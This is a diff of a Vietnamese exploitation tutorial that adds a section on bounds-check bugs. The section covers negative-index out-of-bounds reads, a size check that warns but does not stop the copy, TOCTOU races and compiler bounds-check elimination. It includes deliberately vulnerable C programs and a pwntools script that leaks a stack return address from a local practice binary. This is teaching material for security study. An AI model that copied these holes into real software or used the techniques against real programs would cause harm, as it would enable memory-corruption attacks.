@@ -315,7 +315,7 @@ io.sendline(payload)
 io.interactive()
 ```
 
-### Tổng kết tư duy Săn 0-day với Lỗi Toán Học:
+### Tổng kết các mẹo với Lỗi Toán Học:
 
 | Loại lỗi | Đặc điểm nhận dạng | Mục tiêu tấn công |
 | :--- | :--- | :--- |
@@ -325,7 +325,134 @@ io.interactive()
 
 **Ghi chú quan trọng:** Trong x64, các thanh ghi như `RDI, RSI, RDX` là 64-bit. Khi một lỗi toán học 32-bit xảy ra, hãy quan sát cách CPU mở rộng dấu (**MOVSXD**) hoặc xóa bit cao (**MOV EAX, ...**). Đó là nơi bạn tìm ra "con số kỳ diệu" để kích hoạt OOB.
 
-Bạn đã sẵn sàng để đi sâu hơn vào **Off-by-one** (lỗi lệch 1 byte nhưng bẻ lái cả hệ thống) chưa? Hay bạn muốn tôi giải thích thêm về cách các lỗi toán học này kết hợp với **Heap Feng Shui**?
+---
+
+### Bounds Check Elimination
+
+#### Missing Lower Bound (Quên kiểm tra biên dưới)
+
+Lập trình viên thường chỉ sợ người dùng nhập số quá lớn (`index > max`), nhưng họ quên mất rằng số nguyên có thể là **số âm**.
+
+**Mã nguồn lỗi (Vulnerable Code)**
+```c
+// oob_lower_bound.c
+#include <stdio.h>
+
+int main() {
+    long secret_data = 0x1337133713371337;
+    long public_array[10] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9};
+    int index;
+
+    printf("Enter index to view data: ");
+    scanf("%d", &index);
+
+    // LỖI: Chỉ kiểm tra biên trên, quên biên dưới (index < 0)
+    if (index >= 10) {
+        printf("Out of bounds!\n");
+        return 1;
+    }
+
+    printf("Data at index %d is: 0x%lx\n", index, public_array[index]);
+    return 0;
+}
+```
+
+**Phân tích chiến thuật**
+Trong bộ nhớ Stack x64, các biến được khai báo trước thường nằm ở địa chỉ **cao hơn** các biến khai báo sau. 
+*   `secret_data` nằm ở địa chỉ cao.
+*   `public_array` nằm ở địa chỉ thấp hơn.
+*   Tuy nhiên, các biến cục bộ khác hoặc **Saved RBP / Return Address** của hàm gọi (caller) thường nằm ở địa chỉ **thấp hơn** Stack Frame hiện tại (hoặc cao hơn tùy vào hướng phát triển).
+
+**Kỹ thuật OOB ngược:** Nếu bạn nhập `index = -2`, `index = -5`, CPU sẽ lấy địa chỉ `public_array` trừ đi một khoảng. Điều này cho phép bạn **đọc ngược lên phía trên Stack**, nơi chứa các con trỏ quản lý của hệ điều hành.
+
+---
+
+#### Logic Mismatch (Kiểm tra một đằng, dùng một nẻo)
+
+Đây là lỗi cực kỳ phổ biến trong các trình xử lý giao thức mạng (Network Parsers).
+
+**Mã nguồn lỗi (Vulnerable Code)**
+```c
+// bounds_check_logic.c
+#include <stdio.h>
+#include <string.h>
+
+void handle_packet(char *user_data, int user_len) {
+    char internal_buffer[64];
+    int limit = 64;
+
+    // Bước kiểm tra biên
+    if (user_len > limit) {
+        printf("Packet too large!\n");
+        // LỖI: Cảnh báo nhưng KHÔNG dừng chương trình hoặc không cắt gọn user_len
+    }
+
+    // Vẫn sử dụng user_len gốc để thực hiện thao tác bộ nhớ
+    memcpy(internal_buffer, user_data, user_len); 
+    printf("Packet processed.\n");
+}
+```
+
+**Note:**
+Lập trình viên đôi khi viết code kiểm tra chỉ để in ra log cảnh báo (để debug) mà quên mất rằng luồng thực thi vẫn tiếp tục. Khi bạn thấy một đoạn code có `if (len > max) { log("error"); }` mà không có `return` hoặc `exit`, đó chính là 0-day của bạn.
+
+---
+
+#### TOCTOU (Time-of-Check Time-of-Use) - Race Condition
+
+Đây là kỹ thuật nâng cao, thường dùng để săn lỗi trong **Kernel** hoặc các ứng dụng đa luồng (Multi-threaded).
+
+#### Cơ chế hoạt động:
+1.  **Thread A (Check):** Kiểm tra biến `index = 5`. Thấy `5 < 10` (Hợp lệ).
+2.  **Thread B (Attack):** Ngay sau khi Thread A check xong nhưng chưa kịp dùng, Thread B nhảy vào ghi đè giá trị `index = 9999` vào bộ nhớ.
+3.  **Thread A (Use):** Tiếp tục thực hiện lệnh `array[index] = value` với giá trị `index` đã bị sửa thành `9999`.
+
+**Kết quả:** Vượt qua mọi rào cản kiểm tra biên bằng cách tận dụng độ trễ của CPU.
+
+---
+
+#### Advanced: Bounds Check Elimination (BCE) của Compiler
+
+Đây là đỉnh cao của việc "trình biên dịch hại lập trình viên". Để tối ưu tốc độ, các trình biên dịch hiện đại (như LLVM/Clang) sẽ cố gắng đoán xem một lệnh kiểm tra biên có thừa hay không.
+
+Nếu trình biên dịch "nghĩ" rằng một biến `i` luôn nhỏ hơn 10 dựa trên các đoạn code phía trên, nó sẽ **tự động xóa bỏ** câu lệnh `if (i < 10)`. Nếu bạn tìm ra cách đánh lừa logic phân tích của trình biên dịch (thông qua các phép toán phức tạp), bạn sẽ có một cú OOB mà khi đọc mã nguồn C thì thấy có vẻ an toàn, nhưng trong file Binary thì lệnh check đã biến mất.
+
+---
+
+#### Mã khai thác minh họa (Python - OOB Read ngược)
+
+```python
+from pwn import *
+
+# Mục tiêu: Đọc Saved RIP để leak địa chỉ libc
+# Bằng cách sử dụng index âm trong mảng trên Stack
+
+io = process('./oob_lower_bound')
+
+# Giả sử qua debug GDB, ta biết Return Address nằm cách mảng 
+# về phía địa chỉ thấp (index âm) là 8 đơn vị (mỗi đơn vị 8 bytes)
+index_to_leak = -8 
+
+io.sendlineafter(b"view data: ", str(index_to_leak).encode())
+
+io.recvuntil(b"is: ")
+leak = int(io.recvline().strip(), 16)
+
+log.info(f"Leaked Address (RIP): {hex(leak)}")
+
+# Tính toán base address của chương trình
+# base = leak - offset_tu_rip_den_base
+```
+
+### Tổng kết tư duy săn lỗi Bounds Check:
+
+| Chiến thuật | Cách tìm | Mục tiêu |
+| :--- | :--- | :--- |
+| **OOB Ngược** | Tìm các index không check `< 0`. | Đọc/Ghi các dữ liệu quản lý nằm trước mảng. |
+| **Logic Mismatch** | Tìm các câu lệnh `if` check biên nhưng không có `return` thoát hàm. | Thực hiện Buffer Overflow dù đã có check. |
+| **TOCTOU** | Tìm các biến biên được lưu trong bộ nhớ dùng chung (Shared Memory/Global). | Dùng đa luồng để sửa giá trị giữa bước Check và Use. |
+
+**Tips and Tricks:** Khi đọc code, hãy luôn đặt câu hỏi: *"Điều kiện này có thể bị sai không? Nếu tôi là CPU, tôi có thể bỏ qua lệnh này không?"*. 
 
 ---
 
